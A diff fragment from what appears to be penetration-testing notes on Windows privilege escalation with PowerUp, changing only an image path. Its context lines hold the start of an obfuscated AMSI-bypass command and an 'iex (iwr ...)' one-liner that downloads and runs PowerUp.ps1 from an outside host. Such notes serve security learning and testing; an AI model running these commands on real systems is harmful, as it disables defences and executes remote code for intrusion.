@@ -104,7 +104,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 iex (iwr http://192.168.248.2:8090/PowerUp.ps1 -usebasicparsing)
 ```
 
-![](<../../../.gitbook/assets/image (2).png>)
+![](<../../../.gitbook/assets/image (2) (1).png>)
 
 4\. Execute `Invoke-AllChecks` to run all the checks from `PowerUp`.
 
